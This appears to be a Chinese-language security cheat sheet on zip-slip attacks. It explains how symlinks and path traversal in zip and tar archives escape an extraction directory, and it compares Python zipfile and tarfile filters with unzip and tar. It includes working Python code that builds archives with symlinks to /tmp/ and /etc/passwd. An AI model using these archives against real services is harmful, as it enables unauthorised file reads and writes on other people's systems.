---
title: zipslip
draft: false
tags:
  - zipslip
description:
---
## 读文件
### 软链接

当有另外的读/下载文件功能时，但本来只能读某个目录下的文件内容时。

支持软链接的解压方法均可用。

创建一个指向目标的软链接，然后读取/下载

## 写文件
### 软链接
创建一个指向目标父文件夹的软链接，然后往这个软链接里面写文件。

这两个步骤必须分开成两个压缩包解压，否则会报错

`checkdir error:  output/link exists but is not directory`

### 路径穿越方法
打包时，文件名设置为绝对路径，或者`..`路径穿越

## 解压方法
### zipfile.extractall
会过滤绝对路径，过滤`.`和`..`，路径穿越不可用。
不支持软链接，解压后内容会是目标文件路径。

**用不上**

### tarfile.extractall
默认不过滤绝对路径、`..`, 可路径穿越。
软链接可用

Python 3.12后加入了filter可选参数，默认无限制

`filter = 'tar'`时, 不允许解压到外部，允许在目标目录下创建链接到外部的软链接。
**读文件**，不能链接写

`filter = 'data'`时，不允许链接到外部。**没办法**

Python 3.14后默认是data过滤器
### unzip
过滤绝对路径、`..`, 路径穿越不可用
支持软链接

**读文件、链接写**
### tar xvf
同上unzip

## 创建压缩包方法

### tar或者zip
创对应文件，然后再命令行打包。

没法写绝对路径，或者`..`路径穿越

### zipfile
```python
import zipfile
import stat

def add_symlink(zf: zipfile.ZipFile, link_name: str, target: str):
    info = zipfile.ZipInfo(link_name)
    info.create_system = 3  # Unix
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    info.compress_type = zipfile.ZIP_STORED

    # symlink 的内容就是它指向的目标路径
    zf.writestr(info, target)

with zipfile.ZipFile("slip.zip", "w") as zf:
    zf.writestr("output/./target/real.txt", "hello\n")
    add_symlink(zf, "link", "/tmp/")
```

### tarfile
```python
import tarfile
import io

def add_text(tar, name, text):
    data = text.encode()
    info = tarfile.TarInfo(name)
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))

def add_symlink(tar, name, target):
    info = tarfile.TarInfo(name)
    info.type = tarfile.SYMTYPE
    info.linkname = target
    info.mode = 0o777
    tar.addfile(info)

with tarfile.TarFile("slip.tar", "w") as tf:
    # add_text(tf, "link/success", "success!")
    add_symlink(tf, "link", "../../../../../../etc/passwd")
```